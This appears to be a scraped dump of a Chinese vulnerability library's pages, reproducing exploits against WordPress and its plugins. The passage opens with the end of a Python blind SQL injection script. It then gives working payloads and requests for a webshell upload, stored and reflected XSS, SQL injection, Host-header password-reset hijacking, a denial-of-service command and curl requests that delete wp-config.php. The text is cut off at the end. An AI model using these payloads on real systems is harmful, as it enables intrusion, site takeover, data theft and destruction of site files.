\"WP+Cookie+check\"}) def attack(): flag = True data = \"\" length = 1 while flag: flag = False tmp_ascii = 0 for ascii in range(32, 127): tmp_ascii = ascii start_time = time.time() payload = \"{vul_url},(case+when+(select+ascii(substring(user(),{length},1)))%3d{ascii}+then+(select+sleep({TIME})+from+wp_users+limit+1)+else+2+end)+asc%3b\".format(vul_url=vul_url, ascii=ascii, TIME=TIME, length=length) #print(payload) r = S.get(payload) tmp = time.time() - start_time if tmp >= TIME: flag = True break if flag: data += chr(tmp_ascii) length += 1 print(data) login(username, password) attack() 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-23 11:32:44 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Wordpress/12.html":{"url":"0day/Wordpress/12.html","title":"（CVE-2019-15866）WordPress Plugin - Crelly Slider 任意文件上传&RCE漏洞","keywords":"","body":"（CVE-2019-15866）WordPress Plugin - Crelly Slider 任意文件上传&RCE漏洞 一、漏洞简介 WordPress Crelly Slider是一个开源的幻灯片插件。用户可以使用强大的拖放生成器来添加文本、图像、youtube/vimeo视频，并为每个视频制作动画。 WordPress Crelly Slider插件具有20,000多个活动安装。该插件在1.3.4及更低版本中出现任意文件上传漏洞。任意经过身份验证的用户（例如订阅者身份）可通过向wp_ajax_crellyslider_importSlider发送带有恶意PHP文件的ZIP压缩文件来利用该漏洞上传文件并将恶意PHP文件解压到插件目录中。 二、漏洞影响 三、复现过程 漏洞分析 在crelly-slider\\crellyslider.php文件中，存在如下代码 位于上图45行处可见，插件使用if(is_admin())进行判断，满足条件则可以进入上图if分支，并且在58行处将wordpress/ajax.php文件包含进来 接着来分析下ajax.php文件 在crelly-slider/wordpress/ajax.php中存在如下代码 可见上图520行处注册了一个名为wp_ajax_crellyslider_importSlider 的ajax action并指向ajax.php中的crellyslider_importSlider_callback方法。 在wordpress插件调用机制里，crellyslider_importSlider_callback方法可以通过构造 http://0-sec.org/wordpress/wp-admin/admin-ajax.php?action=crellyslider_importSlider 这样的url来访问 具体调用链如下 在搞清楚crellyslider_importSlider_callback方法是如何通过url调用后，继续分析crellyslider_importSlider_callback方法 在crellyslider_importSlider_callback方法中523行处使用crellyslider_importSlider方法来处理上传文件，如下图 接着来看下crellyslider_importSlider方法 crellyslider_importSlider方法将上传zip文件解压，并将解压后的文件存储于/wordpress/temp/路径中，如上图553行红框处 现在梳理一下上文介绍的流程： crelly-slider插件将使用is_admin()方法验证用户是否有使用crellyslider_importSlider_callback方法的使用权限。通过is_admin()方法验证的用户则可以使用crellyslider_importSlider_callback方法上传任意zip压缩包，程序将上传的压缩包中的文件解压至/wordpress/temp/路径。 能使整个流程执行的前提是通过is_admin()的校验。但是is_admin()方法具体是做什么的呢？它是否像字面上看起来的那样：判断用户是否是管理员身份吗？——答案是否定的。 is_admin方法只是用来确定当前请求是否是针对管理界面页面。使用if(is_admin())只是为了确保if条件中的代码在后端管理界面加载，而不会再前台管理界面加载 is_admin方法并没有核实用户是否是管理员身份的能力，其代码如下图: 因此crelly-slider插件开发者误用了is_admin方法，错误的将其用来判断当前操作的用户身份是否为管理员身份。 事实上，只要是是后台文件，都会定义WP_ADMIN常量为true，例如本次漏洞的入口：wp-admin/admin-ajax.php文件，如下图 可见上图17-19行，使用常量WP_ADMIN来标识这是一个后台文件 这就导致了无论什么身份的用户，只要访问后台文件，is_admin方法都会返回true 我们新建一个名为subscriber的用户，其权限为订阅者权限(subscriber) 在wordpress中，订阅者权限具有极低的权限： “具有订阅者用户角色的用户可以登录WordPress站点并更新自己的配置。他们可以根据需要更改密码。订阅者用户角色无法在WordPress管理后台内撰写文章，查看评论或执行任何其他操作。订阅者用户角色无权访问设置，插件或主题，因此无法更改网站上的任何设置” 订阅者wordpress管理页面如下 crelly-slider插件开发者的本意是希望”is_admin”用户拥有调用crellyslider_importSlider ajax接口的权限，但实际上，subscriber身份的用户仍有权限使用crellyslider_importSlider ajax接口上传压缩包并将其中内容解压到/wordpress/temp/路径中 在我们构造的webshell.php文件中写入如下代码 并将其压缩至webshell.zip中 使用subscriber身份的用户的cookie，发送如下POST请求 webshell.zip 中的webshell.php将会被解压到wordpress\\temp目录下，如下图 通过访问这个地址，webshell.php中的内容将会被执行 四、参考链接 https://xz.aliyun.com/t/6841 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-20 23:24:24 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Wordpress/5.html":{"url":"0day/Wordpress/5.html","title":"（CVE-2019-16520）WordPress Plugin - All in One SEO Pack 储存型xss","keywords":"","body":"（CVE-2019-16520）WordPress Plugin - All in One SEO Pack 储存型xss 一、漏洞简介 适用于WordPress的3.2.7之前的“all-in-one-seo-pack plugin”插件（aka All in One SEO Pack）易受存储XSS的影响，原因是该插件通过不安全的占位符替换提供的帖子的SEO特定描述的编码不正确。 二、漏洞影响 wordpress 三、复现过程 1、利用过程 创建或编辑帖子时，可以设置以下值来显示漏洞： Title: test_aiosp_title&<>\"';>a Description: test_aiosp_desc&<>\"'; pt:%post_title% wp_title:%wp_title% bd:%blog_description% sd:%site_description% bt: %blog_title% st: %site_title% desc:%description% 当帖子被保存并以后访问时，将显示JavaScript警报弹出窗口。生成的HTML页面将包含以下代码 test_aiosp_title&amp;&lt;&gt;&quot;&#039;;&lt;script src=&#039;data:text/javascript,alert(1)&#039;&gt;&lt;/script&gt; | XXXXXXX \"'; wp_title:test_aiosp bd: sd: bt: XXXXXXX st: XXXXXXX desc:%description%\" /> 2、详细分析 该插件将几个字段添加到可以创建或编辑帖子的页面上。这样可以为每个帖子设置自定义标题和描述。此处提供的信息将插入meta到帖子页面上的相应-tags中。在将字段的值插入页面的HTML中之前，先对这些字段的值进行转义。 但是，在描述字段中，可以插入占位符，这些占位符在输出前已被某些值替换。也可以为前面提到的标题字段设置一个占位符。相关代码可以在 aioseop_class.php第4546-4548行中找到： if ( false !== strpos( $description, '%post_title%', 0 ) ) { $description = str_replace( '%post_title%', $this->get_aioseop_title( $post, false ), $description ); } 当攻击者在标题字段中设置有效负载并在描述字段中为标题字段的值提供占位符时，标题字段的原始值将被插入描述中。此后该描述未经过清理或编码。这使攻击者可以突破meta-tag属性并插入任意HTML和JavaScript。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-04 15:18:30 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Wordpress/4.html":{"url":"0day/Wordpress/4.html","title":"（CVE-2019-16522）WordPress Plugin - EU Cookie Law (GDPR)  储存型xss","keywords":"","body":"（CVE-2019-16522）WordPress Plugin - EU Cookie Law (GDPR) 储存型xss 一、漏洞简介 WordPress的3.0.6版eu-cookie-law插件（又称为EU Cookie法（GDPR））容易受到存储XSS的影响，原因是管理区域中几个配置选项的编码不正确以及显示的Cookie同意消息。这会影响“字体颜色”，“背景颜色”和“禁用Cookie”文本。具有高特权的攻击者可以攻击其他用户。 二、漏洞影响 wordpress 三、复现过程 /wp-admin/options-general.php?page=peadig_eucookie 管理员可以在配置区域为插件设置多个选项。在插入HTML页面之前，大多数都可以正确转义。但是，可以利用三个设置值来插入任意JavaScript和HTML。那些是： 字体颜色（ Font Color） 背景颜色 （Background Color） “禁用Cookie”文本 （\"Disable Cookie\" Text） “ Fontcolor”的值将插入到显示Cookie同意消息的每个页面上。默认情况下，其他两个仅可在管理区域中利用。 以“字体颜色”为例 将字体颜色的值设置为 #FFFFFF\">alert(1) 便可以突破HTML属性并插入script包含JavaScript 的标签 post包： POST /wp-admin/options.php HTTP / 1.1 [ ... ] [ ... ] peadig_eucookie％5 Bfontcolor％5 D = ％23FFFFFF％22％3E％3Cscript％3Ealert％281％29％3C / script％3E [...] 这时候我们看一下返回值。 在管理区域中，生成的HTML页面如下所示 alert(1) \" class=\"color-field\" data-default-color=\"#ffffff\"/> 在带有cookie消息的页面上，有效负载将被多次插入。生成的HTML如下所示 alert(1) ;background:rgb(0,0,0);background: rgba(0,0,0,0.85);\"> 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-04 15:12:00 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Wordpress/3.html":{"url":"0day/Wordpress/3.html","title":"（CVE-2019-16523）WordPress Plugin - Events Manager  储存型xss","keywords":"","body":"（CVE-2019-16523）WordPress Plugin - Events Manager 储存型xss 一、漏洞简介 WordPress的5.9.5版以上的事件管理器插件（又名“事件管理器”）容易受到存储的XSS的影响，这是由于编码不正确和插入提供给该插件提供的短码属性map_style（locations_map和events_map）的数据所致。 二、漏洞影响 wordpress 三、复现过程 1、利用过程 要利用此漏洞，攻击者需要创建或编辑帖子并插入上面提到的短代码之一。在此示例中，我们使用locations_map简码并将属性设置 map_style为的base64编码值 {\"a\":\"test\\\"alert(1)\"}。 这将导致以下简码： [locations_map test=\"\" map_style=\"eyJhIjoidGVzdFwiPC9zY3JpcHQ+PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0PiJ9Cg==\"] 然后可以将该短代码插入到帖子中，然后由恶意用户发布。任何访问该职位的人都会受到有效载荷的影响，因此是XSS攻击的受害者。 2、详细分析 Events Manager插件提供了用于创建地图小部件的短代码，例如用于显示事件的位置。通过map_style使用简码中的属性提供自定义样式，可以直观地调整这些地图。为了防止XSS ，在shortcode属性内使用HTML 受到限制。但是，在这种情况下，可以注入任意HTML和JavaScript，因为该 map_style属性需要一个以base64编码的JSON对象。这允许绕过消毒。简码locations_map和events_map受此问题影响： 在em-shortcode.php（第43-56行），我们可以看到该属性是经过base64解码的，然后使用json_decode进行了解析。如果JSON语法有效，则将删除空格并将对象作为map_json_style变量传递到模板。请参见下面的代码段： //add JSON style to map $style = ''; if( !empty($args['map_style']) ){ $style= base64_decode($args['map_style']); $style_json= json_decode($style); if( is_array($style_json) || is_object($style_json) ){ $style = preg_replace('/[\\r\\n\\t\\s]/', '', $style); }else{ $style = ''; } unset($args['map_style']); } ob_start(); em_locate_template('templates/map-global.php',true, array('args'=>$args, 'map_json_style' => $style)); 在templates/templates/map-global.php（第16-21行）中，变量无需进一步编码即可插入脚本标签内： if( typeof EM == 'object'){ if( typeof EM.google_map_id_styles != 'object' ) EM.google_map_id_styles = []; EM.google_map_id_styles[''] = ; } 这样就完美的构成了xss payload 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-04 19:40:15 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Wordpress/11.html":{"url":"0day/Wordpress/11.html","title":"（CVE-2019-19133）WordPress Plugin - CSS Hero 4.0.3 反射xss","keywords":"","body":"（CVE-2019-19133）WordPress Plugin - CSS Hero 4.0.3 反射xss 一、漏洞简介 二、漏洞影响 CSS Hero插件 ( 三、复现过程 首先WordPress应用中确保CSS Hero Plugin安装。 poc hxxp:// 0-sec.org/?csshero_action=edit_page&rand=1015&foo%22%3E%3C/iframe%3E%3Cscript%3Ealert(%27Reflected%20XSS%20in%20CSS%20Hero%204.0.3%27)%3C/script%3E%3Ciframe%3Ebar 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-20 23:05:49 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Wordpress/9.html":{"url":"0day/Wordpress/9.html","title":"（CVE-2017-6514）WordPress 4.7.2 敏感信息泄漏","keywords":"","body":"（CVE-2017-6514）WordPress 4.7.2 敏感信息泄漏 一、漏洞简介 WordPress是WordPress基金会的一套使用PHP语言开发的博客平台。该平台支持在PHP和MySQL的服务器上架设个人博客网站。 WordPress 4.7.2版本中存在信息泄露漏洞。该漏洞源于网络系统或产品在运行过程中存在配置等错误。未授权的攻击者可利用漏洞获取受影响组件敏感信息。 二、漏洞影响 WordPress 4.7.2 三、复现过程 CVE-2017-6514通过CFSECURITE查找获得WORDPRESS登录可能的源代码披露 http://www.0-sec.org/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fwww.0-sec.org% 2F＆format = xml 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-14 13:26:11 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Wordpress/16.html":{"url":"0day/Wordpress/16.html","title":"Wordpress <= 4.7.4 XML-RPC API POST META 未校验漏洞","keywords":"","body":"Wordpress 一、漏洞简介 二、漏洞影响 三、复现过程 中文版 以作者身份登录到您的wordpress 上传图片 记住图像/媒体的ID 创建帖子并将图像设置为特色图像（这将创建_thumbnail_id帖子元） 记住帖子ID 我们可以通过修改_thumbnail_id的值来编辑的值（6是帖子ID，5是图片/帖子ID） poc $usr = 'author'; $pwd = 'author'; $xmlrpc = 'http://local.target/xmlrpc.php'; $client = new IXR_Client($xmlrpc); $content = array(\"ID\" => 6, 'meta_input' => array(\"_thumbnail_id\"=>\"xxx\")); $res = $client->query('wp.editPost',0, $usr, $pwd, 6/*post_id*/, $content); 通过这段代码，我们在数据库中添加以下负载 5 %1$%s hello 执行SQL负载 使用作者帐户登录管理面板，转到媒体，例如 http://0-sec.org/wp-admin/upload.php 通过_wpnonce参数可以直接进行sql注入 http://0-sec.org/wp-admin/upload.php?_wpnonce=daab7cfabf&action=delete&media%5B%5D=5%20%251%24%25s%20hello 其中5 %1$%s hello的encode编码是5%20%251%24%25s%20hello这个请求将导致数据库执行以下查询（会有错误） SELECT post_id FROM wp_postmeta WHERE meta_key = '_thumbnail_id' AND meta_value = '5 _thumbnail_id' hello' 这证明了Wordpress中的sql漏洞，正如5%1$%s之后的前一个post值中提到的，hello就是我们的payload 英文原文 In order to understand the writing here, you need to read the previous explanation https://medium.com/websec/wordpress-sqli-bbb2afcc8e94. If you got it, then we can jump to the part and solve the question e.g. how to update / insert our sql payload into _thumbnail_id post meta. PoC start Login to your wordpress as author Upload image Remember ID of the image / media Create post and set image as featured image (this creates _thumbnail_id post meta) Remember the post ID Wordpress ≤ 4.7.4 XML-RPC n case of appropriate wordpress version then we can use the third vulnerability in this versions of wordpress https://wordpress.org/news/2017/05/wordpress-4-7-5/ e.g. Lack of capability checks for post meta data in the XML-RPC API. This means that we can edit the value of _thumbnail_id with the following code ( 6 is the post ID and 5 is image/post ID ) $usr = 'author'; $pwd = 'author'; $xmlrpc = 'http://local.target/xmlrpc.php'; $client = new IXR_Client($xmlrpc); $content = array(\"ID\" => 6, 'meta_input' => array(\"_thumbnail_id\"=>\"5 %1$%s hello\")); $res = $client->query('wp.editPost',0, $usr, $pwd, 6/*post_id*/, $content); and with this code we add the following payload in the DB 5 %1$%s hello Wordpress importer plugin — any version of wordpress This is another approach for changing the _thumbnail_id value in the database. If wordpress instance have enabled this plugin on it, then simple export, change meta value and import will do the job. Execute the SQL payload Login to the administration panel with your author account, go to media e.g. http://local.target/wp-admin/upload.php , grab the _wpnonce value and we are ready to prove our SQLi vulnerability. Issue the following request towards your local instance: local.target/wp-admin/upload.php?_wpnonce=daab7cfabf&action=delete&media%5B%5D=5%20%251%24%25s%20hello where 5%20%251%24%25s%20hello is url encoded 5 %1$%s hello. This request will result with execution of the following query against the DB (will rise error of course): SELECT post_id FROM wp_postmeta WHERE meta_key = '_thumbnail_id' AND meta_value = '5 _thumbnail_id' hello' This proves the SQLi vulnerability in the wordpress and as mention in previous post value after 5 %1$%s e.g. hello is our payload Is this vulnerability dangerous? SQL injection itself is quite dangerous vulnerability, but sometimes have its own limitations. Here at our case depending of the database server configuration or mysql client used on PHP side could be fatal, but in our case best case scenario would be blind sql injection. Sure, we all know the trivial attack vector, but here we have 2 facts that go against wordpress: meta value database column type e.g. size constraint media parameter could be POST parameter e.g. will have huge size This two facts guide us to the conclusion that even with blind sqli one query would be enough to calculate some crucial DB cell value. 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-23 00:18:59 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Wordpress/17.html":{"url":"0day/Wordpress/17.html","title":"Wordpress <= 4.8.2 POST META 校验绕过漏洞","keywords":"","body":"Wordpress 一、漏洞简介 二、漏洞影响 三、复现过程 一个MySQL的trick 1). 正常的条件查询语句 mysql> SELECT * FROM wp_postmeta WHERE meta_key = '_thumbnail_id'; +---------+---------+----------------+------------+ | meta_id | post_id | meta_key | meta_value | +---------+---------+----------------+------------+ | 4 | 4 | _thumbnail_id | TESTC | +---------+---------+----------------+------------+ 1 row in set (0.00 sec) 2). 现在我们将_thumbnail_id修改成”\\x00_thumbnail_id” mysql> update wp_postmeta set meta_key = concat(0x00,'TESTC') where meta_value = '_thumbnail_id'; Query OK, 0 rows affected (0.00 sec) Rows matched: 0 Changed: 0 Warnings: 0 3). 再次执行第一步的查询 mysql> SELECT * FROM wp_postmeta WHERE meta_key = '_thumbnail_id'; +---------+---------+----------------+------------+ | meta_id | post_id | meta_key | meta_value | +---------+---------+----------------+------------+ | 4 | 4 | _thumbnail_id | TESTC | +---------+---------+----------------+------------+ 1 row in set (0.00 sec) 我们可以发现依然可以查询出修改后的数据。 POST META 校验绕过 我们来看下检查meta_key的代码，文件./wp-includes/meta.php： function is_protected_meta( $meta_key, $meta_type = null ) { $protected = ( '_' == $meta_key[0] ); /** * Filters whether a meta key is protected. * * [@since](/since) 3.2.0 * * [@param](/param) bool $protected Whether the key is protected. Default false. * [@param](/param) string $meta_key Meta key. * [@param](/param) string $meta_type Meta type. */ return apply_filters( 'is_protected_meta', $protected, $meta_key, $meta_type ); } isprotected_meta函数只检查了$meta_key的第一个字符是否以开头。我们有了2.1的MySQL trick，想要绕过meta_key的检查就显得容易多了。 poc 添加自定义字段，meta_key为’_thumbnail_id’的meta_value为’55 %1$%s or sleep(10)#’ 在添加自定义栏目/字段时抓包，将_thumbnail_id替换为%00_thumbnail_id 访问/wp-admin/edit.php?action=delete&_wpnonce=xxx&ids=55 %1$%s or sleep(10)#，触发SQL注入漏洞 参考 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-23 00:19:04 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Wordpress/18.html":{"url":"0day/Wordpress/18.html","title":"（CVE-2017-8295）WordPress <=4.8.3 任意密码重置/HOST头注入漏洞","keywords":"","body":"（CVE-2017-8295）WordPress 2.3-4.8.3 任意密码重置/HOST头注入漏洞 一、漏洞简介 在 WordPress 2.3-4.8.3 版本中找回密码功能未正确设置发送邮件的信息，在发送找回密码邮件的过程中直接使用 Host 地址作为邮件请求头的一部分，在一些情况下攻击者可利用该功能窃取找回密码邮件内容。 二、漏洞影响 WordPress 2.3-4.8.3 三、复现过程 漏洞分析 在 WordPress 中， wp_mail() 函数用来发送邮件，在发送邮件的过程中如果没有设置 发件地址（From） ，则会自动使用 'wordpress@' + $_SERVER['SERVER_NAME'] 作为邮件的 发件地址。主流的 Web 服务器中的 SERVER_NAME 变量来自于客户端请求中 HTTP_HOST 头，这就意味着该发件地址是用户可控的。 wp_mail() 函数的声明在文件 WordPress/wp-includes/pluggable.php 中： function wp_mail( $to, $subject, $message, $headers = '', $attachments = array() ) { ...//ignore if ( !isset( $from_email ) ) { // Get the site domain and get rid of www. $sitename = strtolower( $_SERVER['SERVER_NAME'] ); if ( substr( $sitename, 0, 4 ) == 'www.' ) { $sitename = substr( $sitename, 4 ); } $from_email = 'wordpress@' . $sitename; } /** * Filters the email address to send from. * * @since 2.2.0 * * @param string $from_email Email address to send from. */ $from_email = apply_filters( 'wp_mail_from', $from_email ); /** * Filters the name to associate with the \"from\" email address. * * @since 2.3.0 * * @param string $from_name Name associated with the \"from\" email address. */ $from_name = apply_filters( 'wp_mail_from_name', $from_name ); $phpmailer->setFrom( $from_email, $from_name ); ...//ignore } 在某些情况下邮件服务器会直接将邮件的 发件地址 作为 退件地址（Return-Path），当邮件发送失败时邮件会被自动转发到 退件地址。因为 发件地址 可被篡改，因此找回密码邮件的内容可能会被发送到恶意的邮件服务器中。 漏洞复现 安装 WordPress 程序 此处的管理员邮箱设置为不存在的邮箱地址 demo@0-sec.org，用来模拟通过DNS攻击/DOS攻击使管理员的找回密码邮件发送失败 创建邮箱账户 演示中我们使用的是 wordpress@0-sec.org 通过在线终端，发起找回密码请求，并篡改 HTTP_HOST 请求头 我们这里使用在线终端模拟攻击内网的 WordPress 网站。 在线终端中执行： curl -v 'http://0-sec.org/wp-login.php?action=lostpassword' -H 'Host: vulnspy.com' --data 'user_login=admin&redirect_to=&wp-submit=Get+New+Password' post数据包： POST /wp/wordpress/wp-login.php?action=lostpassword HTTP/1.1 Host: injected-attackers-mxserver.com Content-Type: application/x-www-form-urlencoded Content-Length: 56 user_login=admin&redirect_to=&wp-submit=Get+New+Password 如果此时邮件发送失败，邮件会被自动退回到 wordpress@0-sec.org。即原本要发送管理员邮箱 demo@0-sec.org 的邮件会被发送到 wordpress@0-sc.org 使用 wordpress@0-sec.org 接收找回密码邮件 如果利用成功 wordpress@v0-sec.org 会接收到密码重置邮件。 如果邮件内容没有显示找回密码链接，可以通过邮件源文件发现找回密码链接 使用找回密码链接修改密码 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-22 23:52:32 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Wordpress/14.html":{"url":"0day/Wordpress/14.html","title":"（CVE-2018-6389）WordPress <= 4.9.x 拒绝服务漏洞","keywords":"","body":"（CVE-2018-6389）WordPress 一、漏洞简介 二、漏洞影响 WordPress 三、复现过程 漏洞分析 在文件 WordPress/wp-admin/load-scripts.php 中： registered ) ) { continue; } $path = ABSPATH . $wp_scripts->registered[ $handle ]->src; $out .= get_file( $path ) . \"\\n\"; } ...//ignore echo $out; exit; load-scripts.php 文件会根据load参数传入的文件名依次载入文件并输出。同时程序对load参数的内容进行了过滤，只有在白名单$wp_scripts中的JS文件才会被载入。 该JS文件白名单的内容在文件 WordPress/wp-includes/script-loader.php 中： ...//ignore $scripts->add( 'wp-lists', \"/wp-includes/js/wp-lists$suffix.js\", array( 'wp-ajax-response', 'jquery-color' ), false, 1 ); // WordPress no longer uses or bundles Prototype or script.aculo.us. These are now pulled from an external source. $scripts->add( 'prototype', 'https://ajax.googleapis.com/ajax/libs/prototype/1.7.1.0/prototype.js', array(), '1.7.1' ); $scripts->add( 'scriptaculous-root', 'https://ajax.googleapis.com/ajax/libs/scriptaculous/1.9.0/scriptaculous.js', array( 'prototype' ), '1.9.0' ); $scripts->add( 'scriptaculous-builder', 'https://ajax.googleapis.com/ajax/libs/scriptaculous/1.9.0/builder.js', array( 'scriptaculous-root' ), '1.9.0' ); $scripts->add( 'scriptaculous-dragdrop', 'https://ajax.googleapis.com/ajax/libs/scriptaculous/1.9.0/dragdrop.js', array( 'scriptaculous-builder', 'scriptaculous-effects' ), '1.9.0' ); ...//ignore $scripts->add( 'jquery-ui-sortable', \"/wp-includes/js/jquery/ui/sortable$dev_suffix.js\", array( 'jquery-ui-mouse' ), '1.11.4', 1 ); $scripts->add( 'jquery-ui-spinner', \"/wp-includes/js/jquery/ui/spinner$dev_suffix.js\", array( 'jquery-ui-button' ), '1.11.4', 1 ); $scripts->add( 'jquery-ui-tabs', \"/wp-includes/js/jquery/ui/tabs$dev_suffix.js\", array( 'jquery-ui-core', 'jquery-ui-widget' ), '1.11.4', 1 ); $scripts->add( 'jquery-ui-tooltip', \"/wp-includes/js/jquery/ui/tooltip$dev_suffix.js\", array( 'jquery-ui-core', 'jquery-ui-widget', 'jquery-ui-position' ), '1.11.4', 1 ); $scripts->add( 'jquery-ui-widget', \"/wp-includes/js/jquery/ui/widget$dev_suffix.js\", array( 'jquery' ), '1.11.4', 1 ); ...//ignore JS文件白名单中共有181个文件。如果我们请求 load-scripts.php 文件使其同时载入全部JS文件，PHP代码将要进行181次的读取操作。若同时发起多个载入全部JS文件的请求，这将极大地消耗服务器资源，即有可能导致网站无法正常响应其他用户的请求。 漏洞利用 https://github.com/ianxtianxt/CVE-2018-6389 python doser.py -g 'http://0-sec.org/wp-admin/load-scripts.php?c=1&load%5B%5D=eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter&ver=4.9' -t 100 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-22 22:07:50 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Wordpress/20.html":{"url":"0day/Wordpress/20.html","title":"Wordpress <= 4.9.6 任意文件删除漏洞","keywords":"","body":"Wordpress 一、漏洞简介 利用条件L：需要进入后台 二、漏洞影响 三、复现过程 添加新媒体 访问http://0-sec.org/wp-admin/upload.php，然后上传图片。 将$ meta ['thumb']设置为我们要删除的文件 单击我们在中上传的图像Step 2，并记住图像的ID。 访问http://0-sec.org/wp-admin/post.php?post=4&action=edit._wpnonce在页面源中查找 发送有效载荷： curl -v 'http://0-sec.org/wp-admin/post.php?post=4' -H 'Cookie: ***' -d 'action=editattachment&_wpnonce=***&thumb=../../../../wp-config.php' 发动攻击 在页面源码中查找 _wpnonce 发送有效载荷 curl -v 'http://9c9b.vsplate.me/wp-admin/post.php?post=4' -H 'Cookie: ***' -d 'action=delete&_wpnonce=***' 刷新页面 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-23 00:16:22 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Wordpress/19.html":{"url":"0day/Wordpress/19.html","title":"（CVE-2019-6977）WordPress 5.0 rce","keywords":"","body":"（CVE-2019-6977）WordPress 5.0 RCE 一、漏洞简介 漏洞条件：拥有一个author权限的账号 二、漏洞影响 影响包括windows、linux、mac在内的服务端，后端图片处理库为gd/imagick都受到影响，只不过利用难度有所差异。 其中，原文提到只影响release 5.0.0版，但现在官网上可以下载的5.0.0已经修复该漏洞。实际在WordPress 5.1-alpha-44280更新后未更新的4.9.9~5.0.0的WordPress都受到该漏洞影响。 三、复现过程 传图片 改信息 保留该数据包，并添加POST &meta_input[_wp_attached_file]=2019/02/2-4.jpg#/../../../../themes/twentynineteen/32.jpg 触发需要的裁剪 裁剪 同理保留改数据包，并将POST改为下面的操作，其中nonce以及id不变 action=crop-image&_ajax_nonce=8c2f0c9e6b&id=74&cropDetails[x1]=10&cropDetails[y1]=10&cropDetails[width]=10&cropDetails[height]=10&cropDetails[dst_width]=100&cropDetails[dst_height]=100 触发需要的裁剪 图片已经过去了 包含，我们选择上传一个test.txt，然后再次修改信息，如前面 